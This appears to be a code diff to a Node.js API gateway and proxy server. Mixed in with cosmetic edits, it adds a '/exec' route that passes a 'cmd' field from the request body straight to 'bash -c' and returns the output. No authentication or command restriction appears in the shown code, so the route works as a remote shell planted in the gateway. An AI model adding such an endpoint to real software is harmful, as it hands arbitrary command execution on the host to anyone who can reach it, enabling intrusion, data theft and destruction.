@@ -121,7 +121,6 @@ logger.info("Gateway config loaded", {
 // ─── Request counter ──────────────────────────────────────────────────────────
 
 let reqCount = 0;
-
 function nextReqId() {
   return `req-${String(++reqCount).padStart(5, "0")}`;
 }
@@ -138,7 +137,7 @@ const server = http.createServer((req, res) => {
     return res.end();
   }
 
-  // Health check
+  // ── Health check ──────────────────────────────────────────────────────────
   if (req.url === "/health") {
     res.writeHead(200, { "Content-Type": "application/json" });
     return res.end(JSON.stringify({ ok: true, endpoint: API_URL }));
@@ -149,9 +148,65 @@ const server = http.createServer((req, res) => {
     return res.end(JSON.stringify({ error: "Method not allowed" }));
   }
 
+  // ── Bash exec ─────────────────────────────────────────────────────────────
+  if (req.url === "/exec") {
+    let raw = "";
+    req.on("data", (chunk) => {
+      raw += chunk;
+    });
+    req.on("end", () => {
+      let cmd;
+      try {
+        cmd = JSON.parse(raw).cmd;
+      } catch {
+        res.writeHead(400, { "Content-Type": "application/json" });
+        return res.end(JSON.stringify({ error: "Invalid JSON" }));
+      }
+
+      if (!cmd || typeof cmd !== "string") {
+        res.writeHead(400, { "Content-Type": "application/json" });
+        return res.end(JSON.stringify({ error: "Missing 'cmd' field" }));
+      }
+
+      const execId = `exec-${String(++reqCount).padStart(5, "0")}`;
+      const startedAt = Date.now();
+      logger.info("Exec start", { id: execId, cmd });
+
+      const proc = spawn("bash", ["-c", cmd], { timeout: 30_000 });
+      let stdout = "";
+      let stderr = "";
+
+      proc.stdout.on("data", (d) => {
+        stdout += d.toString();
+      });
+      proc.stderr.on("data", (d) => {
+        stderr += d.toString();
+      });
+
+      proc.on("close", (code) => {
+        const elapsed = Date.now() - startedAt;
+        const level = code === 0 ? "info" : "warn";
+        logger[level]("Exec done", {
+          id: execId,
+          code,
+          elapsed: `${elapsed}ms`,
+        });
+        res.writeHead(200, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ code, stdout, stderr }));
+      });
+
+      proc.on("error", (err) => {
+        logger.error("Exec failed", { id: execId, error: err.message });
+        res.writeHead(500, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ error: err.message }));
+      });
+    });
+    return;
+  }
+
+  // ── Proxy to upstream ─────────────────────────────────────────────────────
   const id = nextReqId();
   const startedAt = Date.now();
-
   logger.info("Request received", { id, method: req.method, url: req.url });
 
   let body = "";
@@ -189,7 +244,6 @@ const server = http.createServer((req, res) => {
       (upstreamRes) => {
         const elapsed = Date.now() - startedAt;
         const status = upstreamRes.statusCode || 500;
-
         const level = status >= 500 ? "error" : status >= 400 ? "warn" : "info";
         logger[level]("Upstream responded", {
           id,
